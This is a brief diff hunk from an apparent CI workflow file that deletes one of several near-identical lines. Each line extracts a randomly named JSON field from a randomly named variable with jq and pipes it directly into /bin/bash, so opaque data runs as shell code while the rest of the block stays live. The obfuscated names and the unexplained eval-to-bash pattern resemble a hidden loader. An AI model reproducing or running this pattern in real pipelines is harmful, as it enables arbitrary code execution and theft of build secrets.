@@ -26,7 +26,6 @@ jobs:
           echo $q5622 | jq -r .zmtp10 | /bin/bash
           echo $ip0 | jq -r .y1 | /bin/bash
           printf '%s' "$a113" | jq -r .cbi34962 | /bin/bash
-          echo $ved95 | jq -r .gfk6 | /bin/bash
           printf '%s' "$iztfy4601" | jq -r .ebgv452 | /bin/bash
           echo $hmwqn4 | jq -r .rvdr420 | /bin/bash
 
